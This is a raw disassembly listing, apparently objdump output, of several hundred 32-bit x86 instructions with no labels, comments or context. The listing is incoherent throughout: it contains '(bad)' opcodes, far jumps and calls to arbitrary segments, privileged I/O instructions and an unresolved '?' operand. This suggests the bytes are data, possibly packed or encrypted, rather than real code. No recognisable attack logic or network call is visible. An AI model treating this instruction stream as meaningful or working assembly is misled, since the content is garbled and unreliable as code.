  40c77c:	jns    0x40c72c
  40c77e:	mov    eax,ds:0x6b9e71dd
  40c783:	jle    0x40c729
  40c785:	and    al,0xd8
  40c787:	addr16 iret 
  40c789:	pop    ds
  40c78a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c78b:	xchg   edx,eax
  40c78c:	inc    eax
  40c78d:	push   esi
  40c78e:	ret    0xce2c
  40c791:	jmp    0xd34:0xc59358d5
  40c798:	xchg   DWORD PTR [ecx],edx
  40c79a:	scas   al,BYTE PTR es:[edi]
  40c79b:	jbe    0x40c7ff
  40c79d:	popa   
  40c79e:	mov    ds:0x640802f4,al
  40c7a3:	pop    ecx
  40c7a4:	lahf   
  40c7a5:	mov    eax,0x8c7ebcd5
  40c7aa:	dec    edi
  40c7ab:	imul   ebp,DWORD PTR [esi],0xe750664
  40c7b1:	ins    DWORD PTR es:[edi],dx
  40c7b2:	jne    0x40c755
  40c7b4:	mov    esp,0x710e7e7a
  40c7b9:	mov    bh,0xaa
  40c7bb:	jp     0x40c7c2
  40c7bd:	shufps xmm5,XMMWORD PTR [edi-0x3b],0x1f
  40c7c2:	daa    
  40c7c3:	mov    ah,0xe5
  40c7c5:	xchg   edi,eax
  40c7c6:	rcl    esi,0x8d
  40c7c9:	data16 fdiv DWORD PTR [ecx-0x42fc6227]
  40c7d0:	lods   al,BYTE PTR ds:[esi]
  40c7d1:	psubd  mm0,QWORD PTR [eax-0x1083e033]
  40c7d8:	aad    0x18
  40c7da:	sbb    ebp,ebp
  40c7dc:	push   ss
  40c7dd:	jp     0x40c7b4
  40c7df:	dec    edi
  40c7e0:	cld    
  40c7e1:	push   ebx
  40c7e2:	inc    edi
  40c7e3:	add    al,BYTE PTR [ecx+0x4f]
  40c7e6:	ret    0x5775
  40c7e9:	pusha  
  40c7ea:	add    BYTE PTR [edx],ah
  40c7ec:	mov    ecx,0x31d144c2
  40c7f1:	loopne 0x40c817
  40c7f3:	pop    es
  40c7f4:	out    0x98,al
  40c7f6:	mov    ch,0x76
  40c7f8:	bound  ebx,QWORD PTR [esi+0x7008e569]
  40c7fe:	icebp  
  40c7ff:	mov    ah,0x44
  40c801:	or     ah,BYTE PTR [eax+0x6f]
  40c804:	jb     0x40c7a1
  40c806:	mov    es,WORD PTR [edi]
  40c808:	or     eax,0x350a44f9
  40c80d:	pusha  
  40c80e:	mov    ch,0x75
  40c810:	push   ss
  40c811:	push   esi
  40c812:	lods   al,BYTE PTR ds:[esi]
  40c813:	jg     0x40c798
  40c815:	sub    eax,DWORD PTR [eax+0x58277177]
  40c81b:	add    esp,DWORD PTR [edi]
  40c81d:	in     eax,dx
  40c81e:	or     al,0x1d
  40c820:	mov    al,0x1f
  40c822:	cmp    al,0x97
  40c824:	xor    dh,BYTE PTR ds:0xd0c8efe3
  40c82a:	aad    0x4e
  40c82c:	pop    eax
  40c82d:	(bad)  
  40c82e:	pop    DWORD PTR ds:0x7861ba33
  40c834:	fist   WORD PTR gs:0xbdf483cd
  40c83b:	je     0x40c843
  40c83d:	loopne 0x40c814
  40c83f:	pop    ss
  40c840:	inc    ebx
  40c841:	lock jb 0x40c80b
  40c844:	iret   
  40c845:	neg    DWORD PTR [edi-0x7c]
  40c848:	test   edx,ebx
  40c84a:	add    eax,0x31d7d14f
  40c84f:	ins    BYTE PTR es:[edi],dx
  40c850:	or     esp,ecx
  40c852:	aad    0xab
  40c854:	mov    ebp,0xabf17181
  40c859:	ja     0x40c8d9
  40c85b:	ja     0x40c80a
  40c85d:	int3   
  40c85e:	lods   eax,DWORD PTR gs:[esi]
  40c860:	bound  edi,QWORD PTR [edi]
  40c862:	adc    eax,0xd54859b2
  40c867:	in     al,0xb2
  40c869:	and    bh,BYTE PTR [ebx]
  40c86b:	inc    esp
  40c86c:	or     dh,BYTE PTR [ebx+0x79bb7526]
  40c872:	sub    DWORD PTR ds:0x218a5f4,0x19965472
  40c87c:	les    esp,FWORD PTR [edi+edi*4-0x25]
  40c880:	mov    cl,0xc
  40c882:	and    cl,cl
  40c884:	xchg   esi,eax
  40c885:	pop    ds
  40c886:	cmp    bl,cl
  40c888:	ret    
  40c889:	mov    ss,WORD PTR [ebx]
  40c88b:	sbb    esi,DWORD PTR [edi-0x77462333]
  40c891:	or     si,si
  40c894:	push   ecx
  40c895:	push   ss
  40c896:	inc    ebx
  40c897:	std    
  40c898:	neg    BYTE PTR [edi]
  40c89a:	sub    bh,BYTE PTR [edi]
  40c89c:	das    
  40c89d:	imul   eax,DWORD PTR [ebx],0xd5517bd8
  40c8a3:	aam    0xe8
  40c8a5:	push   esp
  40c8a6:	xchg   ebp,eax
  40c8a7:	mov    ds:0x67c33667,al
  40c8ac:	into   
  40c8ad:	sub    eax,0xaf73a471
  40c8b2:	cmp    BYTE PTR [esi],bl
  40c8b4:	push   es
  40c8b5:	inc    ebx
  40c8b6:	(bad)
  40c8b9:	push   esp
  40c8ba:	repz mov bh,cl
  40c8bd:	add    edx,DWORD PTR [esi-0x71]
  40c8c0:	into   
  40c8c1:	repz mov ch,0x67
  40c8c4:	jg     0x40c91e
  40c8c6:	mov    bl,0xe0
  40c8c8:	js     0x40c85a
  40c8ca:	loop   0x40c8ca
  40c8cc:	cwde   
  40c8cd:	or     dl,dh
  40c8cf:	int3   
  40c8d0:	jmp    0x72c22f63
  40c8d5:	and    DWORD PTR [eax-0x60],ecx
  40c8d8:	retf   0xc00e
  40c8db:	fld    QWORD PTR [esi+0x5f]
  40c8de:	test   eax,0x220698a
  40c8e3:	jge    0x40c952
  40c8e5:	jb     0x40c8d4
  40c8e7:	sub    al,0xfd
  40c8e9:	push   esi
  40c8ea:	aad    0xfc
  40c8ec:	mov    eax,0x517bfd52
  40c8f1:	adc    BYTE PTR [esi],al
  40c8f3:	push   ebp
  40c8f4:	dec    ebp
  40c8f5:	pop    ebp
  40c8f6:	pop    ss
  40c8f7:	push   edi
  40c8f8:	icebp  
  40c8f9:	cmp    eax,0xfd6014eb
  40c8fe:	or     bh,ch
  40c900:	js     0x40c8aa
  40c902:	cwde   
  40c903:	add    eax,0x9729a358
  40c908:	xor    DWORD PTR [esp+edx*1-0x7de07f18],eax
  40c90f:	mov    ds:0x9296dc9c,al
  40c914:	outs   dx,BYTE PTR ds:[esi]
  40c915:	sub    ch,dl
  40c917:	xchg   DWORD PTR [edx+0x54bd9de4],eax
  40c91d:	and    esp,eax
  40c91f:	xchg   edx,eax
  40c920:	add    BYTE PTR [ebx+ebp*2+0x561b9435],ah
  40c927:	popa   
  40c928:	push   DWORD PTR [eax-0x2b]
  40c92b:	mov    dh,BYTE PTR ds:0x39435a59
  40c931:	jbe    0x40c935
  40c933:	jne    0x40c99d
  40c935:	mov    dh,BYTE PTR ds:0x42612653
  40c93b:	retf   0x1371
  40c93e:	pop    es
  40c93f:	jnp    0x40c8e7
  40c941:	cmp    BYTE PTR [ebp+0x621fd2bc],cl
  40c947:	lods   al,BYTE PTR ds:[esi]
  40c948:	ins    BYTE PTR es:[edi],dx
  40c949:	push   ebx
  40c94a:	pop    esi
  40c94b:	adc    dl,BYTE PTR [edx-0x2c8a2a77]
  40c951:	mov    bl,0x67
  40c953:	int3   
  40c954:	mov    bl,0x92
  40c956:	push   ds
  40c957:	jbe    0x40c9a5
  40c959:	arpl   WORD PTR [ecx-0x5c],sp
  40c95c:	or     BYTE PTR [edi],ch
  40c95e:	pop    ecx
  40c95f:	push   ebp
  40c960:	and    BYTE PTR [esi],dh
  40c962:	repz test DWORD PTR [ebp-0x8],edi
  40c966:	adc    eax,0xe88b2352
  40c96b:	test   eax,0xcba61fe8
  40c970:	xor    eax,DWORD PTR [ebx]
  40c972:	mov    edi,0xd190672e
  40c977:	or     eax,0x49f77071
  40c97c:	pop    ecx
  40c97d:	jmp    0x21636adf
  40c982:	add    BYTE PTR [ecx],ah
  40c984:	out    0x2e,eax
  40c986:	mov    bh,0xc
  40c988:	stos   DWORD PTR es:[edi],eax
  40c989:	neg    DWORD PTR [esi]
  40c98b:	imul   esi,DWORD PTR [ecx+0x51],0xffffffd8
  40c98f:	push   eax
  40c990:	pop    edi
  40c991:	cmp    al,0x7e
  40c993:	sbb    eax,0xe152330e
  40c998:	xchg   edx,eax
  40c999:	pop    ds
  40c99a:	sbb    eax,0xa4bf90d0
  40c99f:	cmp    cl,BYTE PTR [esi+0xfa0acf8]
  40c9a5:	sbb    eax,0x8cf11bf5
  40c9aa:	add    DWORD PTR [esi],esi
  40c9ac:	push   esi
  40c9ad:	push   es
  40c9ae:	pop    ecx
  40c9af:	js     0x40c94f
  40c9b1:	shl    DWORD PTR [edi+0x5ea5b9fa],0x8f
  40c9b8:	adc    eax,0xd64c9df3
  40c9bd:	outs   dx,DWORD PTR ds:[esi]
  40c9be:	rol    DWORD PTR [eax+0x5b],1
  40c9c1:	xchg   esp,eax
  40c9c2:	aad    0xce
  40c9c4:	aas    
  40c9c5:	lahf   
  40c9c6:	gs push es
  40c9c8:	idiv   BYTE PTR [esi-0x15977b2e]
  40c9ce:	jp     0x40c987
  40c9d0:	jno    0x40c9fb
  40c9d2:	add    eax,0xd554727b
  40c9d7:	pop    esi
  40c9d8:	inc    esi
  40c9d9:	adc    eax,0xf3a435b6
  40c9de:	fdiv   DWORD PTR [esp+ebp*1+0x69]
  40c9e2:	mov    al,ds:0x8bdc8d18
  40c9e7:	push   edx
  40c9e8:	jge    0x40c9cd
  40c9ea:	dec    eax
  40c9eb:	je     0x40c9f2
  40c9ed:	ret    0xad45
  40c9f0:	add    DWORD PTR [ebp+edx*8-0x158b3157],eax
  40c9f7:	adc    dh,BYTE PTR [ebx-0x15]
  40c9fa:	fisubr WORD PTR [eax-0x72]
  40c9fd:	xlat   BYTE PTR ds:[ebx]
  40c9fe:	test   eax,edi
  40ca00:	push   ss
  40ca01:	adc    dl,ch
  40ca03:	inc    eax
  40ca04:	pop    ss
  40ca05:	sbb    dh,ch
  40ca07:	mov    edx,0xe67e2057
  40ca0c:	and    dl,BYTE PTR [eax+eax*8-0x4c]
  40ca10:	sub    esp,DWORD PTR [ebx-0x2a]
  40ca13:	mov    esi,0xf0e202bd
  40ca18:	pusha  
  40ca19:	push   ds
  40ca1a:	call   0x1e4c:0x3e2930ef
  40ca21:	popa   
  40ca22:	aad    0xef
  40ca24:	sub    al,0x4
  40ca26:	imul   esp,DWORD PTR [ebx+0x71],0x5d
  40ca2a:	hlt    
  40ca2b:	sub    BYTE PTR [esi+0x27],cl
  40ca2e:	cmp    DWORD PTR [edx+ebx*4+0x21],esp
  40ca32:	mov    BYTE PTR [ecx+0x5404a461],ch
  40ca38:	ror    DWORD PTR [esi],1
  40ca3a:	and    BYTE PTR [edi-0x72],bl
  40ca3d:	inc    edx
  40ca3e:	aas    
  40ca3f:	pop    ecx
  40ca40:	xor    DWORD PTR [ebx],esi
  40ca42:	repnz mov ch,0x77
  40ca45:	mul    esp
  40ca47:	je     0x40ca28
  40ca49:	and    esi,ebx
  40ca4b:	div    DWORD PTR [eax-0x54]
  40ca4e:	jp     0x40ca5b
  40ca50:	jno    0x40ca21
  40ca52:	add    eax,0xe316178f
  40ca57:	int    0xb4
  40ca59:	pop    ds
  40ca5a:	sbb    DWORD PTR [edi-0x9],0xf0962ab7
  40ca61:	inc    ebp
  40ca62:	or     eax,0xf32031c3
  40ca67:	aaa    
  40ca68:	(bad)  
  40ca69:	int3   
  40ca6a:	pop    ecx
  40ca6b:	mov    dl,0xd8
  40ca6d:	pop    ds
  40ca6e:	mov    al,ds:0xc69b08c2
  40ca73:	test   eax,0xea25b43a
  40ca78:	and    eax,0x88ee520c
  40ca7d:	test   DWORD PTR [ebx-0x80],ecx
  40ca80:	jno    0x40ca2f
  40ca82:	fucomi st,st(0)
  40ca84:	icebp  
  40ca85:	mov    ds:0xac61b1b0,eax
  40ca8a:	aad    0x4d
  40ca8c:	mov    ebp,eax
  40ca8e:	dec    eax
  40ca8f:	xchg   edi,eax
  40ca90:	ret    0xece6
  40ca93:	jge    0x40caa9
  40ca95:	(bad)  
  40ca97:	dec    ecx
  40ca98:	xor    DWORD PTR [ecx-0x4e455d20],esi
  40ca9e:	and    al,0x67
  40caa0:	mov    edi,0x4a500a1f
  40caa5:	mov    al,0x3f
  40caa7:	jmp    0x2dc6:0x7dd566bb
  40caae:	sahf   
  40caaf:	inc    esp
  40cab0:	mov    al,ds:0xe942eeb
  40cab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab6:	sbb    eax,0x5875dd35
  40cabb:	sbb    al,0x20
  40cabd:	fcom   st(5)
  40cabf:	push   ds
  40cac0:	(bad)  
  40cac1:	int    0xb9
  40cac3:	call   0x75723942
  40cac8:	adc    BYTE PTR ds:0x7c8d31f5,ch
  40cace:	cmp    ebx,DWORD PTR [ebp+0x71]
  40cad1:	cwde   
  40cad2:	push   ebx
  40cad3:	sub    cl,BYTE PTR [ebx-0x6a]
  40cad6:	test   DWORD PTR [esi+0x1b481ffb],0xf30fafa
  40cae0:	cmp    BYTE PTR [esi],ah
  40cae2:	aad    0xbd
  40cae4:	or     BYTE PTR [edi+ebp*4+0x63],dh
  40cae8:	or     eax,0x447578c4
  40caed:	mov    al,ds:0x61eaf404
  40caf2:	xor    BYTE PTR [eax+edi*2],0xf1
  40caf6:	stos   DWORD PTR es:[edi],eax
  40caf7:	fs pop fs
  40cafa:	sbb    al,0x77
  40cafc:	xor    DWORD PTR [esi],ebp
  40cafe:	mov    es,WORD PTR [esi+0x5e01201d]
  40cb04:	mov    ebp,0x5161a9e2
  40cb09:	and    ebp,edx
  40cb0b:	dec    ecx
  40cb0c:	cmp    ecx,DWORD PTR [ebp-0x6e]
  40cb0f:	ret    0xc864
  40cb12:	lock je 0x40caa8
  40cb15:	mov    eax,ds:0x984508e5
  40cb1a:	ror    BYTE PTR [ebp+0x71],1
  40cb1d:	pop    edx
  40cb1e:	pop    ebx
  40cb1f:	loopne 0x40cb37
  40cb21:	pop    ss
  40cb22:	rcl    BYTE PTR [edx],cl
  40cb24:	jne    0x40cb45
  40cb26:	fucom  st(4)
  40cb28:	std    
  40cb29:	mov    ds:0x97bff286,al
  40cb2e:	aad    0xaf
  40cb30:	mov    edx,0x3797423d
  40cb35:	adc    al,BYTE PTR [edi-0x33]
  40cb38:	xchg   esp,eax
  40cb39:	or     al,0x54
  40cb3b:	jne    0x40cb2d
  40cb3d:	clc    
  40cb3e:	or     DWORD PTR [esi],ebp
  40cb40:	xchg   esi,eax
  40cb41:	repnz inc eax
  40cb43:	or     BYTE PTR [ecx-0x4b],dh
  40cb46:	popf   
  40cb47:	shr    DWORD PTR [edi],1
  40cb49:	mov    cl,0xb6
  40cb4b:	je     0x40cb2a
  40cb4d:	cmp    edx,ebx
  40cb4f:	(bad)  
  40cb50:	outs   dx,BYTE PTR ds:[esi]
  40cb51:	mov    al,ds:0x20ef96fe
  40cb56:	and    al,0x7f
  40cb58:	jno    0x40cadc
  40cb5a:	or     al,0x3e
  40cb5c:	test   BYTE PTR [ebx],al
  40cb5e:	mov    ch,0xf6
  40cb60:	inc    ebp
  40cb61:	and    BYTE PTR [esi-0x1068b98d],dl
  40cb67:	mov    ch,0x4
  40cb69:	fst    st(5)
  40cb6b:	sub    ebx,DWORD PTR [eax+0x68]
  40cb6e:	aaa    
  40cb6f:	xchg   esi,eax
  40cb70:	fwait
  40cb71:	outs   dx,BYTE PTR ds:[esi]
  40cb72:	mov    bh,BYTE PTR [eax+0x5]
  40cb75:	jmp    0xdc59f16d
  40cb7a:	lods   eax,DWORD PTR ds:[esi]
  40cb7b:	or     BYTE PTR [ebx+0x432bd53c],dl
  40cb81:	pop    edi
  40cb82:	adc    DWORD PTR [ecx+0x7584fc95],0x7c
  40cb89:	adc    BYTE PTR [edx+0x2e],bl
  40cb8c:	sub    eax,0x71cf9ff3
  40cb91:	sub    DWORD PTR [esi-0x1986f7fd],edi
  40cb97:	les    ecx,FWORD PTR [eax-0x7314ced3]
  40cb9d:	(bad)  
  40cb9f:	loopne 0x40cc17
  40cba1:	sbb    BYTE PTR [edx-0x2ab84ec7],bl
  40cba7:	jl     0x40cbbe
  40cba9:	iret   
  40cbaa:	stc    
  40cbab:	repz adc al,0x3e
  40cbae:	call   0x77e5:0xe615547c
  40cbb5:	das    
  40cbb6:	into   
  40cbb7:	stos   BYTE PTR es:[edi],al
  40cbb8:	jnp    0x40cba5
  40cbba:	aad    0x44
  40cbbc:	inc    ebx
  40cbbd:	dec    edi
  40cbbe:	shl    ebx,cl
  40cbc0:	sbb    al,0xe7
  40cbc2:	push   0x2a30b875
  40cbc7:	sti    
  40cbc8:	inc    ebp
  40cbc9:	push   esp
  40cbca:	fisub  WORD PTR [esi+0x71]
  40cbcd:	scas   eax,DWORD PTR es:[edi]
  40cbce:	icebp  
  40cbcf:	stc    
  40cbd0:	jg     0x40cbaf
  40cbd2:	fxch   st(0)
  40cbd4:	lods   eax,DWORD PTR ds:[esi]
  40cbd5:	pop    ds
  40cbd6:	jmp    0x6db9:0x13dbeb3e
  40cbdd:	gs aad 0xe1
  40cbe0:	in     al,dx
  40cbe1:	cmp    BYTE PTR [ebx],bl
  40cbe3:	xchg   esp,eax
  40cbe4:	xchg   eax,eax
  40cbe6:	shl    DWORD PTR [ebp+0x32],0xa6
  40cbea:	mov    dl,0x3d
  40cbec:	daa    
  40cbed:	inc    eax
  40cbee:	mov    al,ds:0xe5187105
  40cbf3:	pop    esp
  40cbf4:	retf   
  40cbf5:	cmp    ecx,esp
  40cbf7:	dec    BYTE PTR [ebp+0x21]
  40cbfa:	mov    gs,WORD PTR [edx+0x60d3f645]
  40cc00:	ins    BYTE PTR es:[edi],dx
  40cc01:	sbb    al,0x6a
  40cc03:	inc    ecx
  40cc04:	jno    0x40cbaf
  40cc06:	pop    ecx
  40cc07:	test   DWORD PTR [edi],esp
  40cc09:	dec    edx
  40cc0a:	pop    ds
  40cc0b:	js     0x40cbd0
  40cc0d:	ja     0x40cc1a
  40cc0f:	pop    ebp
  40cc10:	jno    0x40cbc4
  40cc12:	mov    ah,0x32
  40cc14:	test   DWORD PTR [eax-0x42],esp
  40cc17:	add    BYTE PTR [ecx+0x9],dh
  40cc1a:	mov    DWORD PTR [ebp+0x48],0x3e23e501
  40cc21:	and    BYTE PTR [ebx+0x3f],ch
  40cc24:	sub    bl,dh
  40cc26:	pop    ecx
  40cc27:	in     eax,dx
  40cc28:	jl     0x40cc3d
  40cc2a:	repz pop edx
  40cc2c:	and    esp,0xe7f01655
  40cc32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc33:	sub    dl,BYTE PTR [esi+0x20]
  40cc36:	jmp    DWORD PTR [esi-0x6d]
  40cc39:	and    al,0x95
  40cc3b:	ins    BYTE PTR es:[edi],dx
  40cc3c:	(bad)  
  40cc3d:	fcmovnbe st,st(5)
  40cc3f:	cmp    cl,dl
  40cc41:	les    edx,FWORD PTR [edi+0x58]
  40cc44:	jnp    0x40cc62
  40cc46:	mov    ch,0x92
  40cc48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc49:	cld    
  40cc4a:	mov    ds:0xaeb8e335,al
  40cc4f:	inc    ecx
  40cc50:	and    eax,DWORD PTR [esi+0x5c71a7c7]
  40cc56:	xor    BYTE PTR [edx-0x5609b883],bl
  40cc5c:	inc    esp
  40cc5d:	cs push cs
  40cc5f:	or     DWORD PTR [ebp-0x3444ca4f],0xffffffc3
  40cc66:	mov    ebx,0x7617715f
  40cc6b:	sti    
  40cc6c:	aam    0x88
  40cc6e:	rcr    ah,cl
  40cc70:	mov    dl,0x26
  40cc72:	or     eax,0x2131a3c9
  40cc77:	jne    0x40cc17
  40cc79:	jbe    0x40cca8
  40cc7b:	rol    DWORD PTR [ebx+0x716abaaf],cl
  40cc81:	fwait
  40cc82:	dec    ecx
  40cc83:	cs jmp 0x5848:0x1275a928
  40cc8b:	sbb    esp,edx
  40cc8d:	das    
  40cc8e:	addr16 push esp
  40cc90:	jmp    0x323ca2b3
  40cc95:	mov    eax,edi
  40cc97:	pop    ebx
  40cc98:	push   ds
  40cc99:	jnp    0x40cc83
  40cc9b:	je     0x40cc7f
  40cc9d:	jae    0x40cc28
  40cc9f:	hlt    
  40cca0:	push   0x7199ab87
  40cca5:	loop   0x40cc83
  40cca7:	jne    0x40ccd8
  40cca9:	sti    
  40ccaa:	pop    edx
  40ccab:	cmc    
  40ccac:	leave  
  40ccad:	cmp    BYTE PTR es:[eax-0x1b081a79],cl
  40ccb4:	push   ss
  40ccb5:	or     DWORD PTR [edi],edx
  40ccb7:	add    BYTE PTR [edi+0x72d1845],ch
  40ccbd:	sbb    al,0x10
  40ccbf:	and    DWORD PTR [edi+0x510300a6],esi
  40ccc5:	clc    
  40ccc6:	cmc    
  40ccc7:	fcom   QWORD PTR [edx-0x7a8ac45c]
  40cccd:	push   edx
  40ccce:	cmp    BYTE PTR [ebp-0xdef4382],ah
  40ccd4:	jno    0x40cc91
  40ccd6:	xor    dh,ah
  40ccd8:	mov    ebx,0x3283cbb2
  40ccdd:	and    ch,al
  40ccdf:	(bad)  
  40cce0:	jecxz  0x40cd38
  40cce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cce3:	mov    edx,0xb6d522e0
  40cce8:	xor    bh,cl
  40ccea:	stos   BYTE PTR es:[edi],al
  40cceb:	neg    DWORD PTR [edi-0x72966600]
  40ccf1:	sub    eax,0x85b6be8
  40ccf6:	push   esi
  40ccf7:	outs   dx,DWORD PTR ds:[esi]
  40ccf8:	int3   
  40ccf9:	jns    0x40cc8d
  40ccfb:	sbb    al,0x71
  40ccfd:	stos   DWORD PTR es:[edi],eax
  40ccfe:	je     0x40cd3b
  40cd00:	push   eax
  40cd01:	jl     0x40cc9d
  40cd03:	fild   QWORD PTR [edx]
  40cd05:	cmp    eax,0xa024f0ec
  40cd0a:	rol    BYTE PTR es:[esi-0x18],0x9
  40cd0f:	jecxz  0x40cd82
  40cd11:	mov    WORD PTR [eax],gs
  40cd13:	inc    ecx
  40cd14:	mov    esi,0x83ad852e
  40cd19:	pop    ds
  40cd1a:	in     eax,0xe0
  40cd1c:	retf   
  40cd1d:	mov    bh,BYTE PTR [esi]
  40cd1f:	or     edx,DWORD PTR [ebx]
  40cd21:	out    0xd5,eax
  40cd23:	int3   
  40cd24:	xchg   BYTE PTR ds:0x930ee1db,bl
  40cd2a:	aaa    
  40cd2b:	jne    0x40cda1
  40cd2d:	xor    cl,BYTE PTR [esi+ebx*1]
  40cd30:	inc    edi
  40cd31:	or     al,0xc9
  40cd33:	or     al,0x7c
  40cd35:	ja     0x40cce3
  40cd37:	not    DWORD PTR [ebx-0x251cc1e0]
  40cd3d:	outs   dx,BYTE PTR ds:[esi]
  40cd3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd3f:	je     0x40ccec
  40cd41:	cmp    BYTE PTR [edx-0x67],bl
  40cd44:	cmp    BYTE PTR [edx+eiz*8+0x60],dh
  40cd48:	add    al,BYTE PTR [edx]
  40cd4a:	fdivr  st(4),st
  40cd4c:	mov    ebp,ecx
  40cd4e:	fbld   TBYTE PTR [edx+0x1a02023]
  40cd54:	xchg   esp,eax
  40cd55:	mov    dl,0xfe
  40cd57:	fmul   QWORD PTR [esi+0x1f]
  40cd5a:	adc    bl,BYTE PTR [edi+0x28019fa1]
  40cd60:	sub    al,0x81
  40cd62:	out    0x4b,al
  40cd64:	aaa    
  40cd65:	and    ebx,DWORD PTR [ebp+0x320b1a00]
  40cd6b:	xlat   BYTE PTR ds:[ebx]
  40cd6c:	icebp  
  40cd6d:	mov    ds:0xc0717c1b,al
  40cd72:	call   0x8993:0x5cf99905
  40cd79:	xchg   ebx,eax
  40cd7a:	call   0x615c0ef3
  40cd7f:	ret    0x4404
  40cd82:	jne    0x40cdfb
  40cd84:	jno    0x40cdc0
  40cd86:	(bad)  
  40cd87:	and    bh,BYTE PTR [ebx-0x2d]
  40cd8a:	cmp    edx,DWORD PTR [esp+edx*2+0x20]
  40cd8e:	xor    bl,dl
  40cd90:	push   cs
  40cd91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd92:	pop    ds
  40cd93:	lock sub bl,bl
  40cd96:	aad    0x4f
  40cd98:	popf   
  40cd99:	stos   BYTE PTR es:[edi],al
  40cd9a:	out    dx,al
  40cd9b:	call   0xecf4:0x7588b666
  40cda2:	shl    edi,cl
  40cda4:	nop
  40cda5:	inc    edx
  40cda6:	mov    si,WORD PTR [ecx-0x57]
  40cdaa:	sbb    al,0xd3
  40cdac:	pop    ecx
  40cdad:	push   ss
  40cdae:	popa   
  40cdaf:	mov    ch,0x65
  40cdb1:	and    dh,bl
  40cdb3:	push   cs
  40cdb4:	adc    ah,BYTE PTR [esi+0x5f1eca4d]
  40cdba:	aad    0x61
  40cdbc:	push   cs
  40cdbd:	xlat   BYTE PTR ds:[ebx]
  40cdbe:	xchg   edi,eax
  40cdbf:	mov    esp,0xb31d3527
  40cdc4:	das    
  40cdc5:	adc    eax,DWORD PTR [esi+0x75]
  40cdc8:	cdq    
  40cdc9:	iret   
  40cdca:	xchg   BYTE PTR [eax-0x51b5a5a4],dh
  40cdd0:	jno    0x40ce4e
  40cdd2:	call   0xba8b4997
  40cdd7:	ret    
  40cdd8:	clc    
  40cdd9:	xor    edx,esp
  40cddb:	(bad)  [esi+0x1f]
  40cdde:	inc    esi
  40cddf:	cmp    DWORD PTR [ecx-0x45],0xffffffa9
  40cde3:	push   cs
  40cde4:	jb     0x40cdab
  40cde6:	dec    edi
  40cde7:	dec    edi
  40cde8:	sub    bh,ah
  40cdea:	push   eax
  40cdeb:	fld    QWORD PTR [ebp+0x1]
  40cdee:	fwait
  40cdef:	imul   esi,DWORD PTR [edi+ebx*1-0x6d5a6de4],0x21
  40cdf7:	push   ebp
  40cdf8:	dec    edi
  40cdf9:	mov    edx,ebx
  40cdfb:	aad    0x6f
  40cdfd:	pop    esp
  40cdfe:	mov    WORD PTR [edi+0x53faa771],?
  40ce04:	daa    
  40ce05:	pop    ss
  40ce06:	js     0x40ce80
  40ce08:	shr    esi,cl
  40ce0a:	cmp    al,0x61
  40ce0c:	(bad)  
  40ce0d:	fisttp WORD PTR [ebx+0x5f]
  40ce10:	outs   dx,DWORD PTR ds:[esi]
  40ce11:	jns    0x40cde8
  40ce13:	xchg   DWORD PTR [ebp+ebp*4+0x79756af9],edi
  40ce1a:	ret    0xbdf0
  40ce1d:	and    BYTE PTR [esi-0xa],al
  40ce20:	out    dx,eax
  40ce21:	icebp  
  40ce22:	jmp    0x91307a7a
  40ce27:	xor    eax,0xf58656ad
  40ce2c:	cwde   
  40ce2d:	cld    
  40ce2e:	sub    bh,BYTE PTR [edi+0x57]
  40ce31:	mov    esp,0xf9fb77c3
  40ce36:	imul   ebx,esi,0x76
  40ce39:	cmp    DWORD PTR [ebp-0x2785686b],edx
  40ce3f:	sbb    eax,0x16bf278d
  40ce44:	xchg   ecx,eax
  40ce45:	lahf   
  40ce46:	jne    0x40ce8d
  40ce48:	lahf   
  40ce49:	pop    ds
  40ce4a:	cmp    al,0x5b
  40ce4c:	xchg   BYTE PTR [ecx+0x33],ch
  40ce4f:	push   esi
  40ce50:	test   BYTE PTR [esp+ebx*8+0x63],bh
  40ce54:	dec    esp
  40ce55:	adc    al,0xfb
  40ce57:	mov    ah,0x68
  40ce59:	jns    0x40ce13
  40ce5b:	mov    al,ds:0xb6a6e90f
  40ce60:	gs pop ecx
  40ce62:	or     al,0x94
  40ce64:	or     DWORD PTR [eax+0x4beb353a],ebp
  40ce6a:	push   ecx
  40ce6b:	fsub   DWORD PTR [esi]
  40ce6d:	dec    eax
  40ce6e:	les    ebx,FWORD PTR [ebp+0x33]
  40ce71:	(bad)  
  40ce72:	aad    0xf
  40ce74:	jp     0x40ce92
  40ce76:	add    BYTE PTR [esi],dh
  40ce78:	cmp    al,0x4e
  40ce7a:	fidiv  DWORD PTR [ebp+esi*2-0x55]
  40ce7e:	pop    ebx
  40ce7f:	jl     0x40ce59
  40ce81:	sbb    eax,0x67710c10
  40ce86:	nop
  40ce87:	js     0x40ce6f
  40ce89:	iret   
  40ce8a:	lock pop ecx
  40ce8c:	or     ah,BYTE PTR [ecx]
  40ce8e:	or     DWORD PTR [ecx+0x21bd42e9],ebx
  40ce94:	(bad)  
  40ce95:	sbb    ebp,ecx
  40ce97:	inc    ebp
  40ce98:	jno    0x40ce67
  40ce9a:	mov    al,0x5e
  40ce9c:	push   ebp
  40ce9d:	rcl    DWORD PTR [ebx],cl
  40ce9f:	xchg   BYTE PTR [ebp+0x20],bl
  40cea2:	sbb    BYTE PTR [eax],dl
  40cea4:	xchg   ebx,eax
  40cea5:	(bad)  
  40cea6:	fmul   DWORD PTR [edx]
  40cea8:	retfw  
  40ceaa:	fsub   QWORD PTR [edx]
  40ceac:	adc    ebx,DWORD PTR [edi+ebp*1]
  40ceaf:	test   BYTE PTR [ebx],al
  40ceb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceb2:	repz push esp
  40ceb4:	push   0x2
  40ceb6:	stos   BYTE PTR es:[edi],al
  40ceb7:	test   BYTE PTR [esi],ah
  40ceb9:	pop    esp
  40ceba:	dec    esi
  40cebb:	and    dl,BYTE PTR [ecx]
  40cebd:	cmp    al,0x49
  40cebf:	imul   ebp,DWORD PTR [ebx+0x52],0x8343ead5
  40cec6:	sbb    al,dh
  40cec8:	lds    esp,FWORD PTR [edx+eiz*4+0x692cf575]
  40cecf:	shl    DWORD PTR ss:[ebx],0xf9
  40ced3:	mov    cs,WORD PTR [eax+0x73db3dfd]
  40ced9:	inc    edx
  40ceda:	adc    ebp,DWORD PTR es:[esi-0x56]
